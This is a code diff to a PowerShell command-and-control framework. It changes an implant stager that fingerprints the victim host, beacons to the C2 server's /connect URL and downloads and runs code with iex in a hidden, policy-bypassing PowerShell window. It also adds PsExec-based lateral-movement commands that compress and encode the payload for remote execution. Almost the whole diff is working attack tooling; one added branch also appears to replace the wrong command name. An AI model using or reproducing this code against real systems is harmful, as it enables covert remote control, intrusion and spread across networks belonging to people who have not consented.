@@ -71,13 +71,13 @@ function Implant-Handler
                 $im_domain = $implant.Domain
                 if ($randomurihost) {
                     if (((get-date).AddMinutes(-10) -gt $implant.LastSeen) -and ((get-date).AddMinutes(-59) -lt $implant.LastSeen)){
-                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_hostname $im_domain ($im_arch)" -ForegroundColor Yellow
+                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_domain @ $im_hostname ($im_arch)" -ForegroundColor Yellow
                     }
                     elseif ((get-date).AddMinutes(-59) -gt $implant.LastSeen){
-                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_hostname $im_domain ($im_arch)" -ForegroundColor Red
+                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_domain @ $im_hostname ($im_arch)" -ForegroundColor Red
                     }
                     else {
-                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_hostname $im_domain ($im_arch)" -ForegroundColor Green
+                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_domain @ $im_hostname ($im_arch)" -ForegroundColor Green
                     } 
                 }
             }
@@ -188,6 +188,8 @@ function Implant-Handler
         Write-Host " Invoke-RunAsProxyPayload -Domain testdomain -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
         write-host " Invoke-WMICommand -IPList/-IPRangeCIDR/-IPAddress <ip> -user <dom\user> -pass '<pass>' -command <cmd>" -ForegroundColor Green
         write-host " Invoke-WMIPayload -IPList/-IPRangeCIDR/-IPAddress <ip> -user <dom\user> -pass '<pass>'" -ForegroundColor Green
+        write-host " Invoke-PsExecPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>'" -ForegroundColor Green
+        write-host " Invoke-PsExecProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>'" -ForegroundColor Green
         write-host " Invoke-WMIDaisyPayload -IPList/-IPRangeCIDR/-IPAddress <ip> -user <dom\user> -pass '<pass>'" -ForegroundColor Green
         write-host " Invoke-WMIProxyPayload -IPList/-IPRangeCIDR/-IPAddress <ip> -user <dom\user> -pass '<pass>'" -ForegroundColor Green
         #write-host " EnableWinRM | DisableWinRM -computer <dns/ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
@@ -237,7 +239,8 @@ if ($cookie) {
 $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
 } $wc }
 function primer {
-$pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$env:username;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
+if ($env:username -eq $env:computername+"$"){$u="SYSTEM"}else{$u=$env:username}
+$pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
 $p64 = [Convert]::ToBase64String($pre)
 $pm = (Get-Webclient -Cookie $p64).downloadstring("http://'+$ipv4address+":"+$serverport+'/connect")
 $pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
@@ -284,52 +287,42 @@ primer | iex }'
             [Object]
             $proxyurl
         )
-        $command = '
-            function Get-Webclient 
-            {
-            Param
-            (
-            [string]
-            $Cookie
-            )
-            $username = "'+$username+'"
-            $password = "'+$password+'"
-            $proxyurl = "'+$proxyurl+'"
-            $wc = New-Object System.Net.WebClient; 
-    
-            if ($proxyurl) {
-            $wp = New-Object System.Net.WebProxy($proxyurl,$true); 
-            $wc.Proxy = $wp;
-            }
-
-            if ($username -and $password) {
-            $PSS = ConvertTo-SecureString $password -AsPlainText -Force; 
-            $getcreds = new-object system.management.automation.PSCredential $username,$PSS; 
-            $wp.Credentials = $getcreds;
-            } else {
-            $wc.UseDefaultCredentials = $true; 
-            }
-
-            if ($cookie) {
-            $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
-            }
-
-            $wc
-            } 
-            function primer
-            {
-            $pretext = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$env:username;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
-            $pretext64 = [Convert]::ToBase64String($pretext)
-            $primer = (Get-Webclient -Cookie $pretext64).downloadstring("http://'+$ipv4address+":"+$serverport+'/connect")
-            $primer = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($primer))
-            $primer
-            } 
-            $primer = primer
-            if ($primer) {$primer| iex} else {
-            start-sleep 10
-            primer | iex
-            }
-        '
+        $command = 'function Get-Webclient ($Cookie)
+{
+$username = "'+$username+'"
+$password = "'+$password+'"
+$proxyurl = "'+$proxyurl+'"
+$wc = New-Object System.Net.WebClient;  
+if ($proxyurl) {
+$wp = New-Object System.Net.WebProxy($proxyurl,$true); 
+$wc.Proxy = $wp;
+}
+if ($username -and $password) {
+$PSS = ConvertTo-SecureString $password -AsPlainText -Force; 
+$getcreds = new-object system.management.automation.PSCredential $username,$PSS; 
+$wp.Credentials = $getcreds;
+} else {
+$wc.UseDefaultCredentials = $true; 
+}
+if ($cookie) {
+$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
+}
+$wc
+} 
+function primer
+{
+if ($env:username -eq $env:computername+"$"){$u="NT AUTHORITY\SYSTEM"}else{$u=$env:username}
+$pretext = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
+$pretext64 = [Convert]::ToBase64String($pretext)
+$primer = (Get-Webclient -Cookie $pretext64).downloadstring("http://'+$ipv4address+":"+$serverport+'/connect")
+$primer = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($primer))
+$primer
+} 
+$primer = primer
+if ($primer) {$primer| iex} else {
+start-sleep 10
+primer | iex
+}'
         $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
         $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
         $payload = $payloadraw -replace "`n", ""
@@ -766,6 +759,52 @@ param
                     $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"
                     $pscommand = $pscommand -replace 'Invoke-WMIPayload', 'Invoke-WMICommand'
                     $pscommand = $pscommand + " -command '$payload'"
+                } else {
+                    write-host "Can't find the payload.bat file, run CreatePayload first"
+                    $pscommand = 'fvdsghfdsyyh'
+                }
+            }
+            if ($pscommand.ToLower().StartsWith('invoke-psexecproxypayload'))
+            {
+                if (Test-Path "$FolderPath\payloads\proxypayload.bat"){ 
+                    CheckModuleLoaded "Invoke-PsExec.ps1" $psrandomuri
+                    $proxypayload = Get-Content -Path "$FolderPath\payloads\proxypayload.bat"
+                    $pscommand = $pscommand -replace 'Invoke-PsExecProxyPayload', 'Invoke-PsExec'
+                    $proxypayload = $proxypayload -replace "powershell -exec bypass -Noninteractive -windowstyle hidden -e ", ""
+                    $rawpayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($proxypayload))
+                    $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($rawpayload)
+                    $CompressedStream = New-Object IO.MemoryStream
+                    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
+                    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
+                    $DeflateStream.Dispose()
+                    $CompressedScriptBytes = $CompressedStream.ToArray()
+                    $CompressedStream.Dispose()
+                    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
+                    $NewPayload = 'iex(New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
+                    $pscommand = $pscommand + " -command `"powershell -exec bypass -Noninteractive -windowstyle hidden -c $NewPayload`""
+                } else {
+                    write-host "Need to run CreateProxyPayload first"
+                    $pscommand = 'fvdsghfdsyyh'
+                }
+            }
+            if ($pscommand.ToLower().StartsWith('invoke-psexecpayload'))
+            {
+                if (Test-Path "$FolderPath\payloads\payload.bat"){ 
+                    CheckModuleLoaded "Invoke-PsExec.ps1" $psrandomuri
+                    $proxypayload = Get-Content -Path "$FolderPath\payloads\payload.bat"
+                    $pscommand = $pscommand -replace 'Invoke-PsExecProxyPayload', 'Invoke-PsExec'
+                    $proxypayload = $proxypayload -replace "powershell -exec bypass -Noninteractive -windowstyle hidden -e ", ""
+                    $rawpayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($proxypayload))
+                    $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($rawpayload)
+                    $CompressedStream = New-Object IO.MemoryStream
+                    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
+                    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
+                    $DeflateStream.Dispose()
+                    $CompressedScriptBytes = $CompressedStream.ToArray()
+                    $CompressedStream.Dispose()
+                    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
+                    $NewPayload = 'iex(New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
+                    $pscommand = $pscommand + " -command `"powershell -exec bypass -Noninteractive -windowstyle hidden -c $NewPayload`""
                 } else {
                     write-host "Can't find the payload.bat file, run CreatePayload first"
                     $pscommand = 'fvdsghfdsyyh'
